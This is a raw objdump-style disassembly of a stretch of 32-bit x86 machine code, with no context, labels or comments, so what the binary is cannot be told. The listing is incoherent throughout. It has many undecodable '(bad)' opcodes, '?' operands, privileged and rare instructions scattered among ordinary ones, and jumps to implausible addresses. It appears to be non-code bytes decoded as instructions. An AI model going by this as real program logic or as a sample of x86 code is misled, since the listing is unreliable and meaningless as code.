  432743:	(bad)  
  432744:	in     al,0xff
  432746:	add    BYTE PTR [ebp+0x0],al
  432749:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43274f:	add    al,bh
  432751:	(bad)  
  432752:	jmp    0x8d85:0x74b0558d
  432759:	dec    DWORD PTR [eax]
  43275b:	call   DWORD PTR [ebp-0x7b]
  43275e:	mov    edi,esi
  432760:	lock call DWORD PTR [ebp-0x75]
  432764:	mov    esi,esp
  432766:	mov    ah,0xc6
  432768:	mov    bh,0xc3
  43276a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  432770:	add    DWORD PTR [eax],0x450050ff
  432776:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43277c:	inc    edi
  43277e:	push   esp
  432780:	jmp    0xcd00:0x670481ff
  432787:	mov    DWORD PTR [ebx],esi
  432789:	clc    
  43278a:	cmp    edi,0xff9cff3b
  432790:	jne    0x43279a
  432792:	mov    eax,eax
  432794:	add    esi,DWORD PTR [eax]
  432796:	int3   
  432797:	inc    ebp
  432798:	cmp    al,0x83
  43279a:	add    BYTE PTR [eax],bl
  43279c:	adc    DWORD PTR [ebx+0x768b5055],eax
  4327a2:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4327a8:	mov    edi,eax
  4327aa:	cmp    BYTE PTR [ebp+0x45],cl
  4327ad:	jmp    0x43273a
  4327af:	mov    ebx,DWORD PTR [esp+ebp*8]
  4327b2:	inc    ebp
  4327b3:	or     al,0x2
  4327b5:	dec    DWORD PTR [ebp+0x18]
  4327b8:	jne    0x43280f
  4327ba:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4327c0:	mov    edi,DWORD PTR [ebx]
  4327c2:	in     al,0x50
  4327c4:	xchg   ecx,eax
  4327c5:	jmp    0x34376ca
  4327ca:	adc    al,0x8b
  4327cc:	inc    ebp
  4327cd:	mov    al,ds:0x8b04008b
  4327d2:	push   ebp
  4327d3:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4327d9:	push   ebp
  4327da:	test   DWORD PTR [ebx-0x2800d701],ecx
  4327e0:	inc    ebp
  4327e1:	dec    ebp
  4327e2:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  4327e8:	mov    DWORD PTR [eax],0xe9ff00f4
  4327ee:	add    al,0x0
  4327f0:	add    BYTE PTR [eax],al
  4327f2:	mov    eax,edx
  4327f4:	push   eax
  4327f5:	rol    DWORD PTR [ebp-0xf0177],1
  4327fb:	bound  eax,QWORD PTR [ebp+0x50]
  4327fe:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432804:	add    BYTE PTR [ecx+0x558df0ff],cl
  43280a:	mov    al,0xf
  43280c:	test   DWORD PTR [edx],edx
  43280e:	call   DWORD PTR [ebp-0x7a0001]
  432814:	(bad)  
  432815:	loop   0x432816
  432817:	jnp    0xc6991c1d
  43281d:	mov    eax,ebx
  43281f:	cmp    al,0x8b
  432821:	(bad)  
  432822:	cld    
  432823:	shr    esi,0xc
  432826:	add    dl,al
  432828:	push   eax
  432829:	lea    eax,[ebp-0x1]
  43282c:	mov    edx,esi
  43282e:	cwde   
  43282f:	cli    
  432830:	add    BYTE PTR [ebp+0x1ffff8ff],al
  432836:	or     BYTE PTR [eax],cl
  432838:	inc    ebp
  432839:	dec    ebp
  43283a:	inc    DWORD PTR [ebx+0x74803914]
  432840:	add    DWORD PTR [ebx+0x451800],ecx
  432846:	call   DWORD PTR [eax+edx*1]
  432849:	add    ecx,DWORD PTR [ebp-0x34]
  43284c:	push   edi
  43284d:	adc    al,0x8
  43284f:	mov    edx,DWORD PTR [ebp-0x14]
  432852:	mov    ecx,DWORD PTR [ebp+0x18]
  432855:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  432859:	inc    DWORD PTR [eax+esi*8]
  43285c:	inc    ebp
  43285d:	stos   BYTE PTR es:[edi],al
  43285e:	mov    edx,DWORD PTR [ebp-0x4]
  432861:	add    DWORD PTR [ebp-0x1c],eax
  432864:	mov    edx,DWORD PTR [ebp-0x70]
  432867:	cmp    eax,DWORD PTR [eax]
  432869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43286a:	mov    eax,DWORD PTR [eax]
  43286c:	cld    
  43286d:	jae    0x4327ef
  43286f:	add    eax,DWORD PTR [ecx]
  432871:	clc    
  432872:	add    BYTE PTR [eax+0x30],dl
  432875:	mov    DWORD PTR [ecx],esi
  432877:	clc    
  432878:	pop    ds
  432879:	inc    ebp
  43287a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432880:	(bad)  
  432881:	push   DWORD PTR [edi]
  432883:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432889:	(bad)  
  43288a:	jae    0x43288b
  43288c:	mov    eax,DWORD PTR [ebp-0x740175]
  432892:	sub    eax,DWORD PTR [eax]
  432894:	add    eax,DWORD PTR [eax]
  432896:	mov    DWORD PTR [ecx+0x5f],eax
  432899:	mov    DWORD PTR [ebx-0x4],ebx
  43289c:	ret    0xff
  43289f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4328a5:	ret    
  4328a6:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4328ac:	add    BYTE PTR [ebp-0x7d],al
  4328af:	mov    DWORD PTR [eax],eax
  4328b1:	add    al,0x84
  4328b3:	inc    DWORD PTR [ecx]
  4328b5:	lea    eax,[eax]
  4328b7:	hlt    
  4328b8:	sar    bh,cl
  4328ba:	test   BYTE PTR [eax+0x1],dl
  4328bd:	inc    ebp
  4328be:	add    BYTE PTR [ebx],dh
  4328c0:	test   BYTE PTR [ebx],0x84
  4328c3:	push   eax
  4328c4:	add    BYTE PTR [ebp+0x0],al
  4328c7:	add    eax,0x86
  4328cc:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4328d2:	add    BYTE PTR [ecx],al
  4328d4:	add    BYTE PTR [eax],al
  4328d6:	mov    esi,0x550030
  4328db:	mov    ecx,DWORD PTR [edi]
  4328dd:	cld    
  4328de:	fidiv  DWORD PTR [ebp+0x0]
  4328e1:	mov    edi,DWORD PTR [ecx]
  4328e3:	xor    BYTE PTR [eax+eax*1],0x84
  4328e7:	add    eax,DWORD PTR [eax]
  4328e9:	sbb    BYTE PTR [eax],al
  4328eb:	jne    0x43289e
  4328ed:	mov    eax,DWORD PTR [ecx]
  4328ef:	sbb    BYTE PTR [eax],al
  4328f1:	mov    DWORD PTR [ebp-0x1],esp
  4328f4:	add    BYTE PTR [eax+0x30e45ca],bh
  4328fa:	ret    0xb7fc
  4328fd:	dec    ebp
  4328fe:	or     al,0x89
  432900:	dec    ebp
  432901:	cld    
  432902:	cmovne ecx,DWORD PTR [eax-0x75]
  432906:	add    edi,esp
  432908:	seto   BYTE PTR [esi-0x72ffffff]
  43290f:	inc    ebp
  432910:	adc    al,0x8b
  432912:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432919:	cmp    DWORD PTR [edi+0x72],edx
  43291c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  432922:	gs cmp al,0x0
  432925:	je     0x4328fd
  432927:	push   eax
  432928:	sar    BYTE PTR [eax],1
  43292a:	mov    bh,0x3e
  43292c:	push   cs
  43292d:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  432933:	add    DWORD PTR [ecx+0x12],ebp
  432936:	dec    edx
  432937:	(bad)  
  432938:	mov    eax,edx
  43293a:	in     al,dx
  43293b:	adc    DWORD PTR [ecx],esi
  43293d:	pop    esi
  43293e:	inc    ecx
  43293f:	leave  
  432940:	or     DWORD PTR [eax],ebx
  432942:	gs push ebp
  432944:	add    ah,ch
  432946:	into   
  432947:	in     al,dx
  432948:	enter  0xb756,0xf0
  43294c:	push   cs
  43294d:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  432957:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  43295d:	jnp    0x7443ae65
  432963:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  432969:	add    BYTE PTR [edi],cl
  43296b:	mov    edi,DWORD PTR [ecx-0x78]
  43296e:	ltr    WORD PTR [ecx-0x7b]
  432972:	dec    DWORD PTR [edi]
  432974:	clc    
  432975:	out    0x45,eax
  432977:	add    BYTE PTR [eax],cl
  432979:	cmp    ebx,0xffffff8c
  43297c:	jge    0x43297e
  43297e:	jb     0x432990
  432980:	je     0x522a00
  432986:	pop    edx
  432987:	push   esi
  432988:	mov    ecx,DWORD PTR [edi]
  43298a:	in     al,dx
  43298b:	rol    DWORD PTR [ebp+0x0],1
  43298e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432995:	cmp    DWORD PTR [ecx],0xfffffff0
  432998:	hlt    
  432999:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43299f:	(bad)  
  4329a1:	push   eax
  4329a2:	jns    0xb8430e20
  4329a8:	lock push cs
  4329aa:	ror    edx,0x3
  4329ad:	test   BYTE PTR [ecx+0x5500e800],cl
  4329b3:	dec    eax
  4329b4:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4329b8:	(bad)  
  4329b9:	mov    esi,0x7f33ff5f
  4329be:	inc    eax
  4329bf:	test   DWORD PTR [edx],eax
  4329c1:	je     0x432983
  4329c3:	mov    ecx,ecx
  4329c5:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4329c9:	and    eax,DWORD PTR [eax+0xf0103]
  4329cf:	jp     0x4329bd
  4329d1:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4329d5:	add    edx,DWORD PTR [edi+0x74]
  4329d8:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4329de:	add    BYTE PTR [ebp-0x74c48bbb],al
  4329e4:	je     0x432969
  4329e6:	cmp    eax,edi
  4329e8:	js     0x432a0d
  4329ea:	add    eax,0xeb0fc003
  4329ef:	jns    0x43297c
  4329f1:	vmread DWORD PTR [ecx+0x45],ebx
  4329f5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  4329fb:	adc    al,0x8b
  4329fd:	jge    0x432a13
  4329ff:	mov    edi,DWORD PTR [eax-0x4]
  432a02:	add    edi,DWORD PTR [edi]
  432a04:	or     bh,bh
  432a06:	push   ebp
  432a07:	push   es
  432a08:	mov    DWORD PTR [ebp-0x4],ebx
  432a0b:	add    edi,esi
  432a0d:	pop    es
  432a0e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432a14:	mov    DWORD PTR [esp+esi*8],ecx
  432a17:	inc    ebp
  432a18:	pop    ebp
  432a19:	xor    DWORD PTR [esi-0x4],0x3b
  432a1d:	add    edx,DWORD PTR [ecx+edi*1]
  432a20:	push   es
  432a21:	clc    
  432a22:	mov    bh,0xdb
  432a24:	jp     0x4329dd
  432a26:	add    cl,BYTE PTR [esi]
  432a28:	div    DWORD PTR [edi+0x4d8b0c1c]
  432a2e:	test   edi,edi
  432a30:	je     0x432a26
  432a32:	mov    eax,ecx
  432a34:	or     BYTE PTR [ebx],al
  432a36:	dec    BYTE PTR [ecx+0x7d3bec7d]
  432a3c:	jbe    0x432ab0
  432a3e:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  432a44:	add    ecx,DWORD PTR [esi]
  432a46:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  432a4c:	add    eax,DWORD PTR [ebx-0x287af783]
  432a52:	je     0x432aa1
  432a54:	mov    DWORD PTR [ecx],edi
  432a56:	mov    esi,eax
  432a58:	hlt    
  432a59:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  432a60:	jb     0x432a22
  432a62:	jmp    0x432a4f
  432a64:	xor    esi,DWORD PTR [ebx]
  432a66:	pop    edi
  432a67:	pop    esi
  432a68:	pop    ebx
  432a69:	ret    
  432a6a:	ret    0x8b
  432a6d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  432a73:	xor    DWORD PTR [esi],0xc
  432a76:	pushf  
  432a77:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  432a7d:	(bad)  
  432a7f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432a86:	dec    ebp
  432a87:	ret    
  432a88:	mov    edi,DWORD PTR [esi-0x4]
  432a8b:	pop    eax
  432a8c:	dec    ebp
  432a8d:	jne    0x432a1a
  432a8f:	xor    edi,esp
  432a91:	inc    eax
  432a92:	dec    ebp
  432a93:	jbe    0x432ae8
  432a95:	inc    eax
  432a96:	pop    ebp
  432a97:	add    edx,DWORD PTR [esi+0x8]
  432a9a:	push   ecx
  432a9b:	dec    eax
  432a9c:	push   ecx
  432a9d:	mov    eax,edi
  432a9f:	and    al,0xf0
  432aa1:	jo     0x432a8e
  432aa3:	mov    eax,DWORD PTR [ebx]
  432aa5:	sbb    BYTE PTR [ebp+0x4d],cl
  432aa8:	mov    eax,DWORD PTR [ebx]
  432aaa:	nop
  432aab:	or     BYTE PTR [eax],al
  432aad:	jne    0x432b06
  432aaf:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432ab5:	cld    
  432ab6:	xor    edi,edi
  432ab8:	add    edi,DWORD PTR [ebp+0x3]
  432abb:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432ac1:	js     0x432a47
  432ac3:	jae    0x432ac7
  432ac5:	(bad)  
  432ac7:	xor    al,0x5d
  432ac9:	jmp    0x432a56
  432acb:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432ad2:	fdecstp 
  432ad4:	test   BYTE PTR [edi],ah
  432ad6:	add    bh,BYTE PTR [ebp+0x0]
  432ad9:	add    ebx,DWORD PTR [ebp-0x77]
  432adc:	mov    edi,eax
  432ade:	cmp    al,0x0
  432ae1:	adc    dh,BYTE PTR [ebx]
  432ae3:	jge    0x432ae8
  432ae5:	mov    edi,DWORD PTR [ebx]
  432ae7:	jl     0x432af8
  432ae9:	clc    
  432aea:	dec    edi
  432aeb:	jge    0x432aed
  432aed:	mov    eax,DWORD PTR [ebx]
  432aef:	jb     0x432af9
  432af1:	mov    ecx,DWORD PTR [ebp-0x8]
  432af4:	mov    edi,edi
  432af6:	xor    edx,DWORD PTR [eax]
  432af8:	add    edi,DWORD PTR [ebx]
  432afa:	mov    DWORD PTR [ebp-0x10],edi
  432afd:	inc    edi
  432afe:	pop    ebp
  432aff:	jge    0x432b3c
  432b01:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432b05:	mov    edx,0xc05d87f0
  432b0a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432b0e:	fimul  WORD PTR [eax]
  432b10:	fist   WORD PTR [ebp+0x1c]
  432b13:	in     al,dx
  432b14:	jne    0x432b02
  432b16:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432b1c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432b20:	fdivp  st(0),st
  432b22:	fild   WORD PTR [ebp+0x4510f85c]
  432b28:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432b2e:	inc    ebp
  432b2f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432b35:	mov    ebp,DWORD PTR [ebx-0x4]
  432b38:	adc    al,0x8b
  432b3a:	rcl    DWORD PTR [eax],0x48
  432b3d:	mov    esi,0x7080803
  432b42:	fiadd  WORD PTR [ebp+0x4d]
  432b45:	mov    WORD PTR [ebx+0x558bfc52],cs
  432b4b:	cld    
  432b4c:	xor    ebx,DWORD PTR [ebx+0x330103]
  432b52:	mov    DWORD PTR [edi+0x872dc],edi
  432b58:	xlat   BYTE PTR ds:[ebx]
  432b59:	into   
  432b5a:	ffreep st(6)
  432b5c:	retf   0x6c7
  432b5f:	iret   
  432b60:	dec    ebp
  432b61:	inc    ebp
  432b62:	mov    DWORD PTR [ebx],edi
  432b64:	fmul   QWORD PTR [edi]
  432b66:	dec    ebp
  432b67:	jnp    0x432b9c
  432b69:	add    BYTE PTR [ebx],al
  432b6b:	mov    ecx,DWORD PTR [esp+edi*8]
  432b6e:	inc    ebp
  432b6f:	dec    ebp
  432b70:	lea    esi,[ebx]
  432b72:	add    DWORD PTR [ebx],eax
  432b74:	jb     0x432bb1
  432b76:	add    BYTE PTR [edi],cl
  432b78:	inc    ebp
  432b79:	imul   eax,edi,0x858bd800
  432b7f:	cld    
  432b80:	clc    
  432b81:	mov    DWORD PTR [ebp+0x0],eax
  432b84:	inc    DWORD PTR [eax]
  432b86:	or     al,0xde
  432b88:	sbb    bh,0x1
  432b8b:	retf   
  432b8c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432b93:	dec    ebp
  432b94:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432b9a:	enter  0x12de,0xdf
  432b9e:	inc    ebp
  432b9f:	pop    ebp
  432ba0:	dec    DWORD PTR [ebx-0x257f0ff4]
  432ba6:	add    DWORD PTR [edx],edx
  432ba8:	add    BYTE PTR [ebp+0x50],dl
  432bab:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432bb1:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432bb7:	or     ah,al
  432bb9:	pop    ss
  432bba:	cdq    
  432bbb:	push   ebp
  432bbc:	clc    
  432bbd:	mov    eax,DWORD PTR [ebp-0x4]
  432bc0:	xor    edx,edx
  432bc2:	add    esi,DWORD PTR [ebx]
  432bc4:	cmp    eax,DWORD PTR [ebx]
  432bc6:	hlt    
  432bc7:	cmp    DWORD PTR [ebx],esp
  432bc9:	or     al,BYTE PTR [ebp+0xf]
  432bcc:	mov    eax,DWORD PTR [edx]
  432bce:	loopne 0x432bd0
  432bd0:	(bad)  
  432bd1:	mov    ecx,esi
  432bd3:	cld    
  432bd4:	pushf  
  432bd5:	pop    ebp
  432bd6:	cdq    
  432bd7:	mov    esi,DWORD PTR [edx]
  432bd9:	lock mov eax,eax
  432bdc:	adc    BYTE PTR [ebx],al
  432bde:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432be5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432beb:	dec    ebp
  432bec:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432bf2:	(bad)  
  432bf3:	iret   
  432bf4:	inc    ebp
  432bf5:	(bad)  
  432bf6:	jne    0x432c45
  432bf8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432bfe:	(bad)  
  432bff:	cmp    ebx,eax
  432c01:	je     0x432b89
  432c03:	add    edi,edi
  432c05:	or     bh,bh
  432c07:	dec    ebp
  432c08:	inc    ebp
  432c09:	mov    esi,DWORD PTR [ebx]
  432c0b:	cld    
  432c0c:	add    ecx,esi
  432c0e:	cmp    ecx,DWORD PTR [eax-0xc]
  432c11:	mov    edx,DWORD PTR [edi]
  432c13:	or     BYTE PTR [ebp-0x7c],al
  432c16:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432c1c:	test   BYTE PTR [ecx+ebx*4],cl
  432c1f:	inc    ebp
  432c20:	xor    bh,BYTE PTR ds:0x8be89c89
  432c26:	out    dx,eax
  432c27:	adc    BYTE PTR [eax],al
  432c29:	jne    0x432bf2
  432c2b:	mov    ebp,esp
  432c2d:	fcomp  DWORD PTR [ebx]
  432c2f:	add    BYTE PTR [ecx],al
  432c31:	inc    DWORD PTR [ebp-0x75]
  432c34:	mov    esp,?
  432c36:	add    al,0xce
  432c38:	mov    ecx,edi
  432c3a:	cld    
  432c3b:	inc    ebp
  432c3c:	fidivr WORD PTR [ebx]
  432c3e:	fbstp  TBYTE PTR [ebp-0x3e]
  432c41:	mov    eax,DWORD PTR [eax]
  432c43:	adc    BYTE PTR [ebx-0x3974038b],cl
  432c49:	fadd   st,st(7)
  432c4b:	add    BYTE PTR [ebp-0x1],al
  432c4e:	mov    ecx,DWORD PTR [esp+edi*8]
  432c51:	inc    ebp
  432c52:	mov    bh,0xc7
  432c55:	loopne 0x432c9c
  432c57:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432c5d:	add    DWORD PTR [ebx],esi
  432c5f:	pushf  
  432c60:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432c66:	mov    eax,edi
  432c68:	cwde   
  432c69:	inc    ebp
  432c6a:	inc    ebp
  432c6b:	jne    0x432bf8
  432c6d:	mov    esp,esp
  432c6f:	clc    
  432c70:	add    al,0x4d
  432c72:	mov    DWORD PTR [ebx],esi
  432c74:	or     al,0x33
  432c76:	inc    ebp
  432c77:	lea    ecx,[ebx-0x398d13fd]
  432c7d:	add    bh,al
  432c7f:	inc    ebp
  432c80:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432c87:	add    ebp,esp
  432c89:	shufps xmm1,xmm3,0xc7
  432c8d:	(bad)  
  432c8e:	jmp    0x748867b7
  432c93:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432c99:	hlt    
  432c9a:	mov    ecx,DWORD PTR [edi]
  432c9c:	fadd   DWORD PTR [ebp+0x0]
  432c9f:	xor    ecx,DWORD PTR [edi]
  432ca1:	add    ecx,ecx
  432ca3:	cmp    edi,edi
  432ca5:	pmuludq mm7,QWORD PTR [edx+0x50]
  432ca9:	(bad)  
  432caa:	jmp    0x432c37
  432cac:	mov    edi,esp
  432cae:	or     al,0xc6
  432cb0:	inc    ebp
  432cb1:	(bad)  
  432cb2:	mov    eax,DWORD PTR [ebp+0x10]
  432cb5:	jne    0x432c40
  432cb7:	mov    eax,DWORD PTR [ecx]
  432cb9:	clc    
  432cba:	add    BYTE PTR [ebp-0x40],cl
  432cbd:	xor    edx,DWORD PTR [eax-0x73]
  432cc0:	jne    0x432cc3
  432cc2:	push   DWORD PTR [edx+0x8]
  432cc5:	add    BYTE PTR [ebp+0x45],al
  432cc8:	mov    ebp,ecx
  432cca:	cld    
  432ccb:	add    BYTE PTR [ebp+0x0],cl
  432cce:	xor    eax,DWORD PTR [ebp+0x3]
  432cd1:	mov    ?,WORD PTR [ebx]
  432cd3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432cd9:	sub    eax,0x5d330e4d
  432cde:	lea    esi,[ebx]
  432ce0:	add    DWORD PTR [ebx],eax
  432ce2:	jb     0x432ccd
  432ce4:	add    BYTE PTR [eax],al
  432ce6:	inc    ebp
  432ce7:	add    bl,ch
  432ce9:	inc    ebp
  432cea:	mov    esi,DWORD PTR [ebx]
  432cec:	or     al,0x3
  432cee:	(bad)  
  432cef:	mov    edi,eax
  432cf1:	in     al,dx
  432cf2:	scas   eax,DWORD PTR es:[edi]
  432cf3:	inc    ebp
  432cf4:	mov    esi,DWORD PTR [ebx]
  432cf6:	in     al,0x3
  432cf8:	add    al,0x89
  432cfa:	mov    ecx,DWORD PTR [eax+edi*8]
  432cfd:	dec    ebp
  432cfe:	(bad)  
  432cff:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432d06:	mov    ecx,eax
  432d08:	cld    
  432d09:	push   es
  432d0a:	dec    ebp
  432d0b:	add    al,0x33
  432d0d:	mov    DWORD PTR [ebx],eax
  432d0f:	in     al,dx
  432d10:	cmp    DWORD PTR [ebp-0x67],eax
  432d13:	mov    eax,DWORD PTR [ebp-0xba0068]
  432d19:	mov    edx,DWORD PTR [ebp-0x4]
  432d1c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432d1f:	xor    eax,DWORD PTR [ebp+0x3]
  432d22:	cmp    DWORD PTR [ebx],0x8b327498
  432d28:	xor    edi,esp
  432d2a:	jmp    0xff772a7c
  432d2f:	add    ecx,DWORD PTR [ebp-0x3f]
  432d32:	xor    ebx,DWORD PTR [edi]
  432d34:	add    eax,ecx
  432d36:	cmp    ebx,DWORD PTR [eax]
  432d38:	mov    ecx,DWORD PTR [ebp-0x4]
  432d3b:	mov    ecx,DWORD PTR [eax]
  432d3d:	adc    BYTE PTR [ebp-0x80],al
  432d40:	jmp    0x432d43
  432d42:	mov    eax,DWORD PTR [eax]
  432d44:	cld    
  432d45:	mov    bh,0xc6
  432d47:	push   ecx
  432d48:	(bad)  
  432d49:	jne    0x432da9
  432d4b:	dec    ecx
  432d4d:	or     BYTE PTR [ecx+ebx*1],cl
  432d50:	push   ebp
  432d51:	inc    ebp
  432d52:	in     al,dx
  432d53:	add    ebp,esp
  432d55:	or     bh,al
  432d57:	dec    ebp
  432d58:	cld    
  432d59:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432d5f:	cmp    DWORD PTR [ecx],0x2
  432d62:	pushf  
  432d63:	dec    DWORD PTR [ebx+0x45510cf4]
  432d69:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432d6f:	mov    edx,DWORD PTR [ecx+0xc]
  432d72:	xor    eax,esi
  432d74:	mov    edx,0xc172c7
  432d79:	inc    ebp
  432d7a:	mov    esi,DWORD PTR [ebp+0x8]
  432d7d:	mov    eax,edx
  432d7f:	call   0x84c7f474
  432d84:	add    DWORD PTR [ecx-0x76bace00],ebx
  432d8a:	mov    ebp,eax
  432d8c:	or     BYTE PTR [eax],dl
  432d8e:	jo     0x432ddd
  432d90:	push   edi
  432d91:	xor    esi,DWORD PTR [ebp+0x3]
  432d94:	(bad)  
  432d95:	pmulhuw mm0,mm1
  432d98:	test   DWORD PTR [ebp-0x8],ecx
  432d9b:	mov    DWORD PTR [ebp-0x67],eax
  432d9e:	mov    eax,DWORD PTR [ebp-0x4]
  432da1:	xor    edi,DWORD PTR [ebp-0x73]
  432da4:	xor    eax,DWORD PTR [ebx]
  432da6:	xor    esi,DWORD PTR [edx+0x3]
  432da9:	add    BYTE PTR [ecx],bh
  432dab:	inc    ebp
  432dac:	(bad)  
  432dad:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432db3:	mov    DWORD PTR [eax],0x750f0004
  432db9:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432dbf:	lock add BYTE PTR [ebp+0x0],cl
  432dc3:	mov    esi,DWORD PTR [ebp-0x18]
  432dc6:	mov    ebp,edx
  432dc8:	or     al,0x72
  432dca:	ja     0x432dcc
  432dcc:	mov    edx,esi
  432dce:	cld    
  432dcf:	(bad)  
  432dd2:	cli    
  432dd3:	mov    esi,DWORD PTR [ebp-0x4]
  432dd6:	cmp    ecx,esi
  432dd8:	bswap  edi
  432dda:	(bad)
  432dde:	mov    esi,DWORD PTR [ebp-0x4]
  432de1:	mov    esi,ecx
  432de3:	clc    
  432de4:	repnz add esi,DWORD PTR [ebp+0x45]
  432de8:	push   ebx
  432de9:	xor    eax,DWORD PTR [ebp+0x3]
  432dec:	cmp    ebx,DWORD PTR [edi-0x64]
  432def:	pop    ebx
  432df0:	jmp    0x432eb7
  432df5:	mov    esi,DWORD PTR [ebp-0x7d]
  432df8:	xor    ebp,DWORD PTR [eax]
  432dfa:	lea    eax,[ebp-0x8]
  432dfd:	ss repnz pushf 
  432e00:	out    dx,eax
  432e01:	(bad)  
  432e02:	neg    eax
  432e04:	ins    DWORD PTR es:[edi],dx
  432e05:	test   esi,edi
  432e07:	clc    
  432e08:	pop    esp
  432e09:	inc    ebp
  432e0a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432e10:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432e16:	add    cl,al
  432e18:	jne    0x432db3
  432e1a:	mov    esi,DWORD PTR [edx]
  432e1c:	in     al,dx
  432e1d:	push   esi
  432e1e:	xor    BYTE PTR [ebp-0xe],dh
  432e21:	add    edi,esi
  432e23:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432e29:	add    cl,bh
  432e2b:	mov    edi,DWORD PTR [ebp+0x8]
  432e2e:	mov    DWORD PTR [ebp-0x14],esi
  432e31:	add    esi,DWORD PTR [ebp+0x3c]
  432e34:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432e3a:	mov    ah,0x3d
  432e3c:	cdq    
  432e3d:	pushf  
  432e3e:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432e44:	jne    0x432dd1
  432e46:	mov    ecx,DWORD PTR [esp+ebp*8]
  432e49:	icebp  
  432e4a:	icebp  
  432e4b:	shl    edx,0xf2
  432e4e:	(bad)  
  432e4f:	mov    ah,0x16
  432e51:	inc    eax
  432e52:	jne    0x432de7
  432e54:	mov    ecx,DWORD PTR [edi]
  432e56:	in     al,dx
  432e57:	jmp    0x432e4a
  432e59:	add    dl,dh
  432e5b:	mov    edi,esi
  432e5d:	or     al,0x8
  432e5f:	inc    ebp
  432e60:	jne    0x432e65
  432e62:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432e68:	ret    
  432e69:	or     bh,bh
  432e6b:	jge    0x432e55
  432e6d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432e73:	xor    edi,eax
  432e75:	add    esi,DWORD PTR [ebp-0x77]
  432e78:	mov    ebx,esp
  432e7a:	clc    
  432e7b:	neg    DWORD PTR [ebp-0x7c]
  432e7e:	xor    eax,DWORD PTR [eax]
  432e80:	cmp    eax,DWORD PTR [eax]
  432e82:	repz jne 0x432e1a
  432e85:	xor    eax,DWORD PTR [ecx]
  432e87:	add    ebx,DWORD PTR [eax]
  432e89:	mov    DWORD PTR [ebp-0x8],eax
  432e8c:	mov    eax,edi
  432e8e:	cld    
  432e8f:	lock pop eax
  432e91:	test   DWORD PTR [ebx],esi
  432e93:	clc    
  432e94:	add    edx,DWORD PTR [edi-0x740bff77]
  432e9a:	fdivp  st(4),st
  432e9c:	test   ecx,esi
  432e9e:	(bad)  
  432e9f:	jnp    0x432ea0
  432ea1:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432ea7:	jae    0x432e34
  432ea9:	sub    edi,esp
  432eab:	(bad)  
  432eac:	shl    DWORD PTR [eax-0x3e],0x89
  432eb0:	leave  
  432eb1:	call   0x8198e5be
  432eb6:	in     al,dx
  432eb7:	(bad)  
  432eb8:	in     al,dx
  432eb9:	add    bh,al
  432ebb:	mov    esp,edi
  432ebd:	in     al,dx
  432ebe:	test   DWORD PTR [ebp-0x8],edi
